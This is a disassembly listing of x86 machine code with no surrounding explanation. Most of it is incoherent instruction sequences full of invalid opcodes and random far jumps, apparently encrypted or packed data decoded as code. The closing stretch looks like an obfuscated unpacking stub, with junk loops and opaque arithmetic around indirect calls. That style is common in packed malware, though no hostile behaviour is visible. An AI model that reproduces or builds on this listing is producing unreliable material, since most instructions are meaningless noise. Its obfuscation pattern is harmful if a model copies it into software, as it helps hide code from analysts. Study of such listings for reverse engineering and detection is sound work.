  40a9e3:	pop    ss
  40a9e4:	inc    eax
  40a9e5:	(bad)  [esi+0x2e8c02ae]
  40a9eb:	adc    esp,DWORD PTR [esi+0x6a3b709]
  40a9f1:	fcom   DWORD PTR [eax]
  40a9f3:	sar    DWORD PTR [edi-0x566b4643],cl
  40a9f9:	ins    BYTE PTR es:[edi],dx
  40a9fa:	mov    ecx,eax
  40a9fc:	in     eax,dx
  40a9fd:	repnz push es
  40a9ff:	in     al,dx
  40aa00:	out    0x83,al
  40aa02:	add    eax,0xfb2913d4
  40aa07:	mov    BYTE PTR [esp+ebp*2+0x6],al
  40aa0b:	jmp    0x40aa6f
  40aa0d:	and    DWORD PTR [ecx-0x5f],0x5d6dd883
  40aa14:	ins    BYTE PTR es:[edi],dx
  40aa15:	dec    ecx
  40aa16:	jno    0x40aa1a
  40aa18:	and    BYTE PTR [ecx+0x5c6e1f8c],ch
  40aa1e:	sti    
  40aa1f:	mov    dl,0xd
  40aa21:	test   BYTE PTR [edx],bh
  40aa23:	inc    edi
  40aa24:	mov    eax,0xafbfe95e
  40aa29:	fadd   st,st(7)
  40aa2b:	addr16 cmp al,0xf
  40aa2e:	cmp    BYTE PTR [edx-0x5a],0xd9
  40aa32:	push   ss
  40aa33:	leave  
  40aa34:	push   esp
  40aa35:	repnz mov edi,0x4e0d910b
  40aa3b:	(bad)  
  40aa3c:	mov    esi,DWORD PTR [ebx-0x39]
  40aa3f:	jg     0x40aa31
  40aa41:	test   DWORD PTR [eax-0x14],0xc5feb217
  40aa48:	outs   dx,BYTE PTR ds:[esi]
  40aa49:	jle    0x40aa2a
  40aa4b:	out    dx,eax
  40aa4c:	inc    edx
  40aa4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa4e:	je     0x40aa11
  40aa50:	imul   ebp,DWORD PTR [ebx+eiz*1+0xc],0xb37c7f46
  40aa58:	or     eax,0xf84a2b49
  40aa5d:	pop    es
  40aa5e:	jne    0x40aa29
  40aa60:	lahf   
  40aa61:	ror    BYTE PTR [ebx-0x42f1d7fd],1
  40aa67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa68:	jno    0x40aa5b
  40aa6a:	(bad)  
  40aa6b:	hlt    
  40aa6c:	(bad)  
  40aa6d:	push   es
  40aa6e:	retf   0xc9d8
  40aa71:	or     ecx,DWORD PTR [ebx+0x76459216]
  40aa77:	outs   dx,BYTE PTR ds:[esi]
  40aa78:	pop    ebp
  40aa79:	and    ah,BYTE PTR [eax-0x5cd1b368]
  40aa7f:	outs   dx,BYTE PTR ds:[esi]
  40aa80:	jge    0x40aadc
  40aa82:	arpl   WORD PTR [ebp+0x1b5f18f7],si
  40aa88:	mov    bh,0xd7
  40aa8a:	scas   al,BYTE PTR es:[edi]
  40aa8b:	jnp    0x40ab05
  40aa8d:	fwait
  40aa8e:	xor    DWORD PTR [edx-0x80],ecx
  40aa91:	clc    
  40aa92:	pop    ss
  40aa93:	cmp    BYTE PTR ds:0x19a9a193,bl
  40aa99:	cmp    eax,0x9d36853b
  40aa9e:	push   eax
  40aa9f:	push   edi
  40aaa0:	adc    eax,0x87aa5377
  40aaa5:	jnp    0x40aa99
  40aaa7:	(bad)  
  40aaa8:	mov    esi,0xad738844
  40aaad:	xchg   esp,eax
  40aaae:	nop
  40aaaf:	sub    dl,al
  40aab1:	sti    
  40aab2:	nop
  40aab3:	out    0x52,al
  40aab5:	push   es
  40aab6:	sub    edx,DWORD PTR [edx+eiz*8]
  40aab9:	xchg   ebx,eax
  40aaba:	inc    ebp
  40aabb:	sub    BYTE PTR [ecx],bl
  40aabd:	lds    edx,FWORD PTR [ebx+0x28]
  40aac0:	mov    ecx,edx
  40aac2:	sub    dl,BYTE PTR [ecx+0x28]
  40aac5:	je     0x40aa9f
  40aac7:	mov    al,ds:0xbb24ea79
  40aacc:	fisub  WORD PTR [esi]
  40aace:	lea    esp,[ecx]
  40aad0:	adc    dh,BYTE PTR [ebx+ebx*1-0x5e281d13]
  40aad7:	rcl    BYTE PTR [edi-0x2afa4fb],1
  40aadd:	and    BYTE PTR [ecx+0x7b],dl
  40aae0:	dec    eax
  40aae1:	or     bl,BYTE PTR [esi+0x4f3b1e4c]
  40aae7:	dec    edi
  40aae8:	jnp    0x40aae4
  40aaea:	add    eax,0xe32ed502
  40aaef:	adc    eax,0xb343503c
  40aaf4:	loopne 0x40aae5
  40aaf6:	sbb    eax,DWORD PTR [eax+0x5d]
  40aaf9:	push   edx
  40aafa:	sub    ebx,DWORD PTR [esi-0x3e]
  40aafd:	ror    al,1
  40aaff:	jb     0x40ab46
  40ab01:	pop    eax
  40ab02:	xchg   esi,eax
  40ab03:	pop    edi
  40ab04:	iret   
  40ab05:	fwait
  40ab06:	jne    0x40aacc
  40ab08:	lahf   
  40ab09:	aad    0x4c
  40ab0b:	nop
  40ab0c:	mov    ecx,0x70e910ed
  40ab11:	mov    esp,0x9e2caeb4
  40ab16:	idiv   DWORD PTR [ecx]
  40ab18:	rcr    BYTE PTR [ebx+esi*1-0x4b34efb3],0x2f
  40ab20:	mov    ah,0xdb
  40ab22:	(bad)
  40ab26:	dec    ebx
  40ab27:	arpl   WORD PTR [ecx+0x6e1c8851],bx
  40ab2d:	imul   esp,DWORD PTR [edi+0x13],0xd67444c4
  40ab34:	or     eax,0xe03aa8b7
  40ab39:	in     eax,dx
  40ab3a:	push   ecx
  40ab3b:	nop
  40ab3c:	xor    BYTE PTR [esi],dl
  40ab3e:	push   0x711d146a
  40ab43:	jg     0x40ab69
  40ab45:	cmp    edi,ebx
  40ab47:	or     ebx,ecx
  40ab49:	outs   dx,BYTE PTR ds:[esi]
  40ab4a:	pop    ds
  40ab4b:	fadd   DWORD PTR [edx+ebp*2]
  40ab4e:	xor    BYTE PTR [eax-0x3d40b592],0xb7
  40ab55:	jge    0x40ab9e
  40ab57:	std    
  40ab58:	fdivr  QWORD PTR [esi+ecx*4]
  40ab5b:	mov    dl,0x8d
  40ab5d:	into   
  40ab5e:	pop    ecx
  40ab5f:	dec    ebp
  40ab60:	je     0x40ab7e
  40ab62:	add    ebp,ebx
  40ab64:	shl    DWORD PTR ds:0x5ec29ace,0x6f
  40ab6b:	das    
  40ab6c:	cmp    DWORD PTR [eax+0x7f],edx
  40ab6f:	test   BYTE PTR [edx+0x26329103],0x46
  40ab76:	jmp    0x64ba:0x43670ab4
  40ab7d:	sbb    eax,DWORD PTR fs:[ecx-0x634607dd]
  40ab84:	dec    ebp
  40ab85:	stos   DWORD PTR es:[edi],eax
  40ab86:	ror    BYTE PTR [ebx-0x5a34c09b],1
  40ab8c:	jmp    0x40abfc
  40ab8e:	fidiv  DWORD PTR ds:0x52e273cb
  40ab94:	aad    0x5f
  40ab96:	je     0x40ab35
  40ab98:	push   cs
  40ab99:	sbb    ebx,DWORD PTR [ecx]
  40ab9b:	mov    esi,0x79e8f599
  40aba0:	dec    edx
  40aba1:	jb     0x40ab56
  40aba3:	cs addr16 loop 0x40ab5d
  40aba7:	enter  0x3508,0x2e
  40abab:	retf   
  40abac:	or     eax,0xb7c54650
  40abb1:	cli    
  40abb2:	cmp    BYTE PTR [ebx],bh
  40abb4:	xchg   BYTE PTR [esi],ah
  40abb6:	sbb    al,0x3e
  40abb8:	sub    eax,0x4b6e6a1f
  40abbd:	inc    ebx
  40abbe:	jne    0x40ab49
  40abc0:	hlt    
  40abc1:	dec    esi
  40abc2:	adc    BYTE PTR [esi],0x5
  40abc5:	in     eax,dx
  40abc6:	(bad)  
  40abc7:	out    dx,al
  40abc8:	push   eax
  40abc9:	pusha  
  40abca:	dec    esp
  40abcb:	in     eax,dx
  40abcc:	jmp    0xc2d5c531
  40abd1:	push   es
  40abd2:	gs call 0x9217:0x99c284eb
  40abda:	pop    edi
  40abdb:	aas    
  40abdc:	ins    DWORD PTR es:[edi],dx
  40abdd:	jne    0x40abce
  40abdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abe0:	mov    ch,0x73
  40abe2:	sub    esi,DWORD PTR [eax-0x3b]
  40abe5:	(bad)  
  40abe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abe7:	inc    eax
  40abe8:	inc    ebp
  40abe9:	fwait
  40abea:	cmp    DWORD PTR [edi+ebp*8-0x28da04a9],esp
  40abf1:	icebp  
  40abf2:	jge    0x40ac01
  40abf4:	fsubp  st(5),st
  40abf6:	xchg   edx,eax
  40abf7:	add    al,BYTE PTR [edx]
  40abf9:	cwde   
  40abfa:	cli    
  40abfb:	pop    es
  40abfc:	and    al,BYTE PTR [edx]
  40abfe:	(bad)  
  40abff:	cmp    esi,DWORD PTR [ebx-0x48]
  40ac02:	ret    
  40ac03:	sbb    eax,0x2b3ae2f3
  40ac08:	(bad)  [ecx]
  40ac0a:	and    BYTE PTR [ebp-0x6d],ah
  40ac0d:	sub    esp,DWORD PTR [edx+0x5e]
  40ac10:	sub    al,0xa8
  40ac12:	out    dx,al
  40ac13:	lock fild QWORD PTR [ebx+eiz*2+0x6e]
  40ac18:	mov    bh,0xfb
  40ac1a:	push   eax
  40ac1b:	and    ebp,ecx
  40ac1d:	xchg   ebp,eax
  40ac1e:	nop
  40ac1f:	loope  0x40ac21
  40ac21:	lods   eax,DWORD PTR ds:[esi]
  40ac22:	ins    BYTE PTR es:[edi],dx
  40ac23:	mov    ecx,0xcef69968
  40ac28:	pop    eax
  40ac29:	shl    BYTE PTR [eax+0x36d50f00],0x34
  40ac30:	jae    0x40ac3d
  40ac32:	mov    eax,ds:0xa6da899e
  40ac37:	jl     0x40abf4
  40ac39:	pop    ebx
  40ac3a:	sbb    al,0xec
  40ac3c:	xor    DWORD PTR [edx+0x73cded0d],0x5a
  40ac43:	repnz shl dh,0x67
  40ac47:	xor    edx,DWORD PTR [eax]
  40ac49:	pop    eax
  40ac4a:	enter  0x6666,0xa6
  40ac4e:	ret    0x3320
  40ac51:	sti    
  40ac52:	xor    BYTE PTR [ebx+esi*1],bl
  40ac55:	shl    BYTE PTR cs:[ebx+0x34d55c84],0x41
  40ac5d:	mov    ecx,0xb8bb5120
  40ac62:	clc    
  40ac63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac64:	lods   al,BYTE PTR ds:[esi]
  40ac65:	dec    edi
  40ac66:	lahf   
  40ac67:	js     0x40ac60
  40ac69:	mov    ebp,0x7d4a8211
  40ac6e:	mov    al,0x20
  40ac70:	pushf  
  40ac71:	add    dl,0xf8
  40ac74:	outs   dx,BYTE PTR ds:[esi]
  40ac75:	inc    ebx
  40ac76:	shl    DWORD PTR [edi+0x41280289],cl
  40ac7c:	and    al,0xf
  40ac7e:	xor    al,0x20
  40ac80:	dec    esi
  40ac81:	int    0x13
  40ac83:	jmp    0xd58b50ad
  40ac88:	and    DWORD PTR [ecx],esi
  40ac8a:	sbb    ecx,esp
  40ac8c:	fmul   QWORD PTR [esi+ebx*2-0x6a93bd1f]
  40ac93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac94:	je     0x40ac96
  40ac96:	data16 jecxz 0x40acfd
  40ac99:	bound  eax,QWORD PTR [ebp+0x35c9ab6d]
  40ac9f:	aad    0xbe
  40aca1:	fisttp WORD PTR [eax+0x1a]
  40aca4:	leave  
  40aca5:	add    al,0x5
  40aca7:	cmp    cl,bh
  40aca9:	cwde   
  40acaa:	in     al,0x22
  40acac:	mov    ds:0xb706fdf8,eax
  40acb1:	push   es
  40acb2:	mov    ebp,0x53ad9e60
  40acb7:	mov    al,ds:0xf54a0a93
  40acbc:	fist   DWORD PTR [ecx]
  40acbe:	sti    
  40acbf:	cli    
  40acc0:	fisttp QWORD PTR [ecx]
  40acc2:	aad    0x3
  40acc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acc5:	pushf  
  40acc6:	jno    0x40ac89
  40acc8:	jmp    0x6cd4:0x9bbaf6d5
  40accf:	xchg   edi,eax
  40acd0:	lods   eax,DWORD PTR ds:[esi]
  40acd1:	add    dl,al
  40acd3:	enter  0x4bd8,0xd1
  40acd7:	setbe  BYTE PTR [ebx]
  40acda:	jns    0x40acac
  40acdc:	(bad)
  40ace0:	sbb    al,0x8
  40ace2:	pop    ds
  40ace3:	fidivr DWORD PTR [edi+0x1e8c34c8]
  40ace9:	popa   
  40acea:	jbe    0x40ad11
  40acec:	xchg   ebx,eax
  40aced:	adc    BYTE PTR [edx+eax*8+0x36],ch
  40acf1:	mov    ebp,DWORD PTR [ebx]
  40acf3:	bound  esi,QWORD PTR [esp+edi*4]
  40acf6:	ret    0x81f
  40acf9:	xchg   ebp,eax
  40acfa:	jbe    0x40ad06
  40acfc:	xor    bl,BYTE PTR [eax-0x4b0e937]
  40ad02:	icebp  
  40ad03:	pop    ss
  40ad04:	dec    edx
  40ad05:	push   cs
  40ad06:	dec    al
  40ad08:	pmovmskb esp,mm4
  40ad0b:	aas    
  40ad0c:	lds    ebx,FWORD PTR [esi+edi*4+0x7a65486]
  40ad13:	fmul   st,st(2)
  40ad15:	xor    DWORD PTR [ebx+eax*4],edx
  40ad18:	dec    ecx
  40ad19:	test   DWORD PTR [eax],0xa32876d4
  40ad1f:	addr16 pop edi
  40ad21:	pop    ebx
  40ad22:	xor    esi,ebp
  40ad24:	pop    edi
  40ad25:	fwait
  40ad26:	pop    es
  40ad27:	mov    dh,0xbe
  40ad29:	pop    ecx
  40ad2a:	xor    BYTE PTR [ecx],0xcb
  40ad2d:	jmp    0xc418:0x746ec4dd
  40ad34:	nop
  40ad35:	xchg   BYTE PTR [esi],dl
  40ad37:	mov    edx,0x50e29846
  40ad3c:	out    dx,eax
  40ad3d:	test   eax,0xcdb72ad0
  40ad42:	or     eax,0x436cbe70
  40ad47:	adc    cl,cl
  40ad49:	dec    eax
  40ad4a:	std    
  40ad4b:	xchg   BYTE PTR [edx+esi*4-0x2b01865b],dl
  40ad52:	js     0x40ad50
  40ad54:	test   DWORD PTR [edi-0x4f310828],ebp
  40ad5a:	out    dx,al
  40ad5b:	aas    
  40ad5c:	outs   dx,DWORD PTR ds:[esi]
  40ad5d:	aaa    
  40ad5e:	call   0x726c:0x76fa56f9
  40ad65:	ja     0x40adc8
  40ad67:	test   al,0x83
  40ad69:	add    dl,BYTE PTR [ecx]
  40ad6b:	fsubr  QWORD PTR [edi]
  40ad6d:	xor    eax,0x88644720
  40ad72:	mov    eax,0xdd76bd10
  40ad77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad78:	cmc    
  40ad79:	addr16 xor ah,dh
  40ad7c:	sbb    BYTE PTR [esi+ebp*4+0x2a],0xf0
  40ad81:	fidiv  DWORD PTR [ebx+0x2c]
  40ad84:	out    0xb5,eax
  40ad86:	stos   BYTE PTR es:[edi],al
  40ad87:	cli    
  40ad88:	mov    esi,0xd4ef940a
  40ad8d:	jb     0x40ad9c
  40ad8f:	pop    esp
  40ad90:	xchg   BYTE PTR [ebx-0x56490a],bl
  40ad96:	lds    ebp,FWORD PTR [edi+0x35]
  40ad99:	mov    cl,0xc
  40ad9b:	ds es adc edx,ebx
  40ad9f:	mov    ebp,0x8d15d2a7
  40ada4:	les    ebx,FWORD PTR [edx+0x3eb0b7cd]
  40adaa:	adc    BYTE PTR [ecx+0x4a242c1c],0x59
  40adb1:	and    DWORD PTR [eax],0x7c
  40adb4:	hlt    
  40adb5:	ret    
  40adb6:	mov    ds:0x12bad27e,eax
  40adbb:	cmp    al,0x62
  40adbd:	jnp    0x40ae02
  40adbf:	in     eax,dx
  40adc0:	xchg   BYTE PTR [ebx-0x6b921345],bh
  40adc6:	mov    edi,esi
  40adc8:	shl    DWORD PTR [edi+0x30c40e5b],1
  40adce:	lahf   
  40adcf:	push   es
  40add0:	int    0xee
  40add2:	or     DWORD PTR [esi],edx
  40add4:	scas   eax,DWORD PTR es:[edi]
  40add5:	mov    al,0x8d
  40add7:	mov    ds,WORD PTR [edx+0x39]
  40adda:	fs jno 0x40ae1e
  40addd:	jne    0x40ad68
  40addf:	arpl   WORD PTR ds:0xb28c61a5,dx
  40ade5:	in     al,dx
  40ade6:	xor    dh,cl
  40ade8:	clc    
  40ade9:	sub    eax,0x2715b20c
  40adee:	and    ah,cl
  40adf0:	ror    DWORD PTR [edi-0x21],1
  40adf3:	in     eax,0xc6
  40adf5:	jmp    0xa718:0xd6207937
  40adfc:	fst    QWORD PTR [ebp+0x20]
  40adff:	jne    0x40ae3b
  40ae01:	mov    DWORD PTR [ebp+edx*1+0x48db1d6e],ebp
  40ae08:	mov    ds:0x89339982,al
  40ae0d:	clc    
  40ae0e:	jecxz  0x40ae46
  40ae10:	fidivr DWORD PTR [edi]
  40ae12:	push   es
  40ae13:	fwait
  40ae14:	enter  0x6c0c,0xc5
  40ae18:	mov    esi,0xaa65daf7
  40ae1d:	pop    ebp
  40ae1e:	imul   eax,DWORD PTR [ebp+0x1d],0x6a
  40ae22:	and    ah,cl
  40ae24:	mov    esp,DWORD PTR [esi-0x4e]
  40ae27:	add    esi,DWORD PTR [ebx]
  40ae29:	aam    0xb
  40ae2b:	jae    0x40ae72
  40ae2d:	(bad)  
  40ae2e:	or     al,0x2f
  40ae30:	clc    
  40ae31:	sub    bl,bl
  40ae33:	mov    WORD PTR [ebx+eiz*1],?
  40ae36:	push   ecx
  40ae37:	arpl   WORD PTR [edx-0x39],bx
  40ae3a:	dec    esp
  40ae3b:	test   bl,al
  40ae3d:	jl     0x40add3
  40ae3f:	outs   dx,BYTE PTR ds:[esi]
  40ae40:	or     al,0x51
  40ae42:	xor    ecx,DWORD PTR [ecx+0x41]
  40ae45:	dec    edi
  40ae46:	and    DWORD PTR [eax+edi*8],esi
  40ae49:	mov    dh,0xfe
  40ae4b:	(bad)  
  40ae4c:	cld    
  40ae4d:	daa    
  40ae4e:	mov    dl,BYTE PTR [edi+0x3d]
  40ae51:	or     dl,BYTE PTR [ebx]
  40ae53:	cdq    
  40ae54:	retf   0xea36
  40ae57:	lods   eax,DWORD PTR ds:[esi]
  40ae58:	fist   WORD PTR [edx]
  40ae5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae5b:	repz add esp,edx
  40ae5e:	jae    0x40ae2c
  40ae60:	cs fcom st(2)
  40ae63:	test   eax,0x3ac7aa08
  40ae68:	xchg   edx,eax
  40ae69:	mov    edx,0xa99bf072
  40ae6e:	mov    ch,0x87
  40ae70:	cmp    al,0x83
  40ae72:	xchg   BYTE PTR [ebx-0x6c846739],dh
  40ae78:	sbb    ebp,eax
  40ae7a:	fisub  WORD PTR [edx+0x6c]
  40ae7d:	and    BYTE PTR [ecx+0xa],dl
  40ae80:	mov    eax,ss:0x71e3a4d0
  40ae86:	mov    ecx,edx
  40ae88:	les    ebp,FWORD PTR [ebp+0xefe7a56]
  40ae8e:	inc    esi
  40ae8f:	clc    
  40ae90:	call   0x2a5e76c8
  40ae95:	imul   ebp,DWORD PTR [edi+0x3dc62c12],0x3f088753
  40ae9f:	pop    DWORD PTR [eax-0x39793598]
  40aea5:	cmp    bl,BYTE PTR [edx]
  40aea7:	test   bh,al
  40aea9:	lock sub al,0x15
  40aeac:	xor    eax,0xeae4e75d
  40aeb1:	daa    
  40aeb2:	movzx  ebp,bl
  40aeb5:	mov    ebp,0xccb00d53
  40aeba:	push   0xc4738ae
  40aebf:	push   eax
  40aec0:	and    bh,BYTE PTR [ebx-0x3731290e]
  40aec6:	pop    edx
  40aec7:	and    eax,DWORD PTR [edi+ebx*1-0x3a]
  40aecb:	push   ecx
  40aecc:	sub    ch,BYTE PTR [edx-0x3c]
  40aecf:	sbb    bl,ah
  40aed1:	cmp    eax,0x8d896491
  40aed6:	and    BYTE PTR [eax+0x6d],dh
  40aed9:	or     bl,BYTE PTR [ecx-0x1a46790d]
  40aedf:	push   ss
  40aee0:	push   ds
  40aee1:	(bad)  
  40aee2:	fsub   st(4),st
  40aee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee5:	sub    DWORD PTR [bx+di+0x42bd],edi
  40aeea:	add    al,0xa7
  40aeec:	sbb    ebx,DWORD PTR [eax-0x7597ac8e]
  40aef2:	mov    al,ds:0xdfe7d36c
  40aef7:	sbb    esp,DWORD PTR [eax+0xd666a06]
  40aefd:	pop    edi
  40aefe:	sar    DWORD PTR [ecx-0x7f8141c4],cl
  40af04:	xchg   ebp,eax
  40af05:	popf   
  40af06:	test   DWORD PTR [edx+edx*2-0x1af27626],ebx
  40af0d:	jno    0x40af88
  40af0f:	rcl    DWORD PTR [edi],cl
  40af11:	mov    BYTE PTR ds:0xe23294f7,al
  40af17:	add    ebp,DWORD PTR [ecx+edx*8]
  40af1a:	bnd jnp 0x40af61
  40af1d:	mov    cl,cl
  40af1f:	scas   al,BYTE PTR es:[edi]
  40af20:	daa    
  40af21:	jbe    0x40af2a
  40af23:	mov    DWORD PTR [edx+0x45ae04e],edx
  40af29:	imul   ecx,DWORD PTR [si+0x7a],0xa87dbc0d
  40af31:	mov    ebx,0xbfe62de0
  40af36:	mov    ecx,0x606d922c
  40af3b:	out    dx,al
  40af3c:	cmp    DWORD PTR [ebp+0x73],0x45
  40af40:	xchg   esi,eax
  40af41:	clc    
  40af42:	xchg   esi,eax
  40af43:	add    DWORD PTR ds:0x7b2bff6c,0x82fc478c
  40af4d:	in     al,0x57
  40af4f:	dec    esp
  40af50:	jbe    0x40af69
  40af52:	xchg   esi,eax
  40af53:	test   al,0x4d
  40af55:	cli    
  40af56:	jae    0x40af5e
  40af58:	test   eax,edi
  40af5a:	scas   eax,DWORD PTR es:[edi]
  40af5b:	cli    
  40af5c:	xlat   BYTE PTR ds:[ebx]
  40af5d:	add    edx,ecx
  40af5f:	frstor ds:0x57311de3
  40af65:	dec    esp
  40af66:	xlat   BYTE PTR ds:[ebx]
  40af67:	mov    ebp,?
  40af69:	sbb    DWORD PTR [esi],0xaf2453fa
  40af6f:	jns    0x40af33
  40af71:	idiv   DWORD PTR [esi-0x7d37116d]
  40af77:	ins    BYTE PTR es:[edi],dx
  40af78:	pop    ecx
  40af79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af7a:	jg     0x40af8b
  40af7c:	pop    ebx
  40af7d:	lock out 0xea,al
  40af80:	stc    
  40af81:	inc    ecx
  40af82:	fs adc eax,0x3ef843f7
  40af88:	and    BYTE PTR [edi+edi*4],al
  40af8b:	test   al,0xb6
  40af8d:	inc    ecx
  40af8e:	int    0x2a
  40af90:	loope  0x40af19
  40af92:	cmp    eax,0x91f3fa6d
  40af97:	mov    ecx,DWORD PTR ds:0xffbe5e12
  40af9d:	lods   al,BYTE PTR ds:[esi]
  40af9e:	js     0x40b00e
  40afa0:	sub    ch,BYTE PTR [esi]
  40afa2:	dec    esi
  40afa3:	icebp  
  40afa4:	dec    ebp
  40afa5:	xor    al,BYTE PTR gs:[edi+eax*8-0x40]
  40afaa:	scas   al,BYTE PTR es:[edi]
  40afab:	mov    esp,0x6ae3ba77
  40afb0:	jg     0x40afd9
  40afb2:	mov    ds:0xd7a935cc,eax
  40afb7:	jl     0x40afd0
  40afb9:	inc    edi
  40afba:	retf   
  40afbb:	in     al,dx
  40afbc:	leave  
  40afbd:	mov    BYTE PTR ss:[eax+0xe],cl
  40afc1:	jo     0x40af60
  40afc3:	ret    
  40afc4:	dec    eax
  40afc5:	xor    bl,BYTE PTR [edi]
  40afc7:	mov    eax,0xe35fca3b
  40afcc:	cmp    ecx,eax
  40afce:	in     al,dx
  40afcf:	js     0x40afb6
  40afd1:	push   ebx
  40afd2:	xor    bh,ch
  40afd4:	outs   dx,BYTE PTR ds:[esi]
  40afd5:	mov    BYTE PTR [eax-0x56fbd55],0xbd
  40afdc:	rcr    BYTE PTR [esi+0x60bbd9bb],cl
  40afe2:	and    eax,0xde47dcdd
  40afe7:	push   ecx
  40afe8:	push   ebx
  40afe9:	sub    bl,ch
  40afeb:	bound  ebx,QWORD PTR [ebx+0x60bccd6b]
  40aff1:	(bad)  
  40aff3:	adc    ebx,DWORD PTR [eax*4+0x46f1c935]
  40affa:	dec    esi
  40affb:	add    al,0xa
  40affd:	out    dx,eax
  40affe:	dec    ecx
  40afff:	adc    dh,bh
  40b001:	out    dx,al
  40b002:	lock aas 
  40b004:	xor    dl,BYTE PTR [edi+0x3a1fa730]
  40b00a:	inc    ecx
  40b00b:	rsqrtps xmm0,XMMWORD PTR [eax]
  40b00e:	cmp    DWORD PTR [ecx+0x3206034f],esp
  40b014:	push   ds
  40b015:	xchg   ch,cl
  40b017:	push   ebp
  40b018:	mov    edi,0xaa37771b
  40b01d:	sti    
  40b01e:	xchg   DWORD PTR [edi-0x1ca98974],edx
  40b024:	lock mov WORD PTR [ecx+0x19],es
  40b028:	mov    al,ds:0xb7e678ac
  40b02d:	pop    es
  40b02e:	xor    eax,0x5dd979bf
  40b033:	mov    esi,0xef966b6c
  40b038:	popa   
  40b039:	adc    bl,BYTE PTR [ecx]
  40b03b:	pop    edx
  40b03c:	lods   eax,DWORD PTR ds:[esi]
  40b03d:	push   edi
  40b03e:	in     al,0x6a
  40b040:	call   0xc2a8:0x3cd10263
  40b047:	mov    ds:0xc3f712b8,eax
  40b04c:	int3   
  40b04d:	or     dh,al
  40b04f:	fisub  WORD PTR [ebx+0x5a5e6374]
  40b055:	add    edi,DWORD PTR [esi+0x1a8df5f8]
  40b05b:	jb     0x40b0cd
  40b05d:	jle    0x40b09c
  40b05f:	xchg   DWORD PTR [esi+ecx*4-0x69],esp
  40b063:	je     0x40b002
  40b065:	push   0xb98b9d66
  40b06a:	mov    BYTE PTR [edi+edx*4],al
  40b06d:	rol    dl,1
  40b06f:	ja     0x40b0dc
  40b071:	xchg   ecx,eax
  40b072:	icebp  
  40b073:	aas    
  40b074:	lock push edx
  40b076:	es pop eax
  40b078:	sub    esi,0xfffffff5
  40b07b:	js     0x40b0ee
  40b07d:	dec    esp
  40b07e:	outs   dx,BYTE PTR ds:[esi]
  40b07f:	sub    eax,0x3f94c94a
  40b084:	xchg   ebx,eax
  40b085:	xchg   ecx,eax
  40b086:	xchg   BYTE PTR [ecx+ebx*2+0x3f],bl
  40b08a:	lea    ebp,[esi]
  40b08c:	test   eax,0x8bf2d2d5
  40b091:	jne    0x40b07b
  40b093:	add    DWORD PTR [eax],esi
  40b095:	mov    DWORD PTR ds:0x42e020,0x14
  40b09f:	cmp    DWORD PTR ds:0x42e020,0x0
  40b0a6:	je     0x40b0e9
  40b0ac:	cmp    DWORD PTR ds:0x42e020,0x17
  40b0b3:	jne    0x40b0c4
  40b0b9:	push   0x43201c
  40b0be:	call   DWORD PTR ds:0x42a038
  40b0c4:	mov    esi,DWORD PTR ds:0x42e020
  40b0ca:	dec    esi
  40b0cb:	mov    DWORD PTR ds:0x42e020,esi
  40b0d1:	jmp    0x40b09f
  40b0d6:	movzx  esi,BYTE PTR ds:0x42e000
  40b0dd:	sbb    esi,DWORD PTR ds:0x42e00c
  40b0e3:	mov    DWORD PTR ds:0x42e000,esi
  40b0e9:	mov    eax,DWORD PTR [ebp-0x4]
  40b0ec:	mov    esi,DWORD PTR [ebp+0xc]
  40b0ef:	or     DWORD PTR ds:0x42f008,0x723c
  40b0f9:	xor    esi,ecx
  40b0fb:	xor    DWORD PTR ds:0x432000,0x430000
  40b105:	add    esi,edx
  40b107:	xor    DWORD PTR ds:0x430010,0x42f01c
  40b111:	imul   esi,DWORD PTR [eax]
  40b114:	mov    DWORD PTR [eax],esi
  40b116:	mov    DWORD PTR ds:0x42e008,0x284b
  40b120:	jmp    0x40b170
  40b125:	and    DWORD PTR ds:0x43200c,0x0
  40b12f:	mov    edi,DWORD PTR ds:0x43200c
  40b135:	inc    edi
  40b136:	mov    DWORD PTR ds:0x43200c,edi
  40b13c:	cmp    DWORD PTR ds:0x43200c,0x17
  40b143:	jne    0x40b158
  40b149:	push   DWORD PTR [ebp-0x18]
  40b14c:	push   DWORD PTR [ebp-0x28]
  40b14f:	push   DWORD PTR [ebp-0x14]
  40b152:	call   DWORD PTR ds:0x42a03c
  40b158:	cmp    DWORD PTR ds:0x43200c,0x14
  40b15f:	jb     0x40b12f
  40b165:	adc    DWORD PTR ds:0x42e000,edx
  40b16b:	mov    esi,DWORD PTR [ebp+0x14]
  40b16e:	xor    DWORD PTR [eax],esi
  40b170:	mov    eax,DWORD PTR [ebp-0x4]
  40b173:	mov    edi,DWORD PTR [ebp+0x10]
  40b176:	xor    edi,ecx
  40b178:	mov    esi,0xffcd8d27
  40b17d:	mov    ebx,esi
  40b17f:	sub    ebx,edi
  40b181:	add    DWORD PTR [eax],ebx
  40b183:	mov    eax,DWORD PTR [ebp-0x4]
  40b186:	mov    edi,DWORD PTR [ebp-0x8]
  40b189:	add    edi,DWORD PTR [eax]
  40b18b:	mov    DWORD PTR [ebp-0x8],edi
  40b18e:	mov    eax,DWORD PTR [ebp+0xc]
  40b191:	mov    edi,DWORD PTR [ebp+0xc]
  40b194:	xor    edi,ecx
  40b196:	xor    eax,ecx
  40b198:	lea    eax,[eax+edi*1+0x64e5b2]
  40b19f:	mov    edi,DWORD PTR [ebp+0xc]
  40b1a2:	xor    edi,ecx
  40b1a4:	add    edi,edx
  40b1a6:	imul   eax,edi
  40b1a9:	mov    edi,DWORD PTR [ebp+0xc]
  40b1ac:	xor    edi,ecx
  40b1ae:	sub    edi,eax
  40b1b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b1b3:	add    edi,edx
  40b1b5:	cmp    DWORD PTR [eax],edi
  40b1b7:	mov    eax,DWORD PTR [ebp-0x4]
  40b1ba:	mov    edi,DWORD PTR [ebp+0x10]
  40b1bd:	jg     0x40b1d0
  40b1c3:	xor    edi,ecx
  40b1c5:	mov    ebx,esi
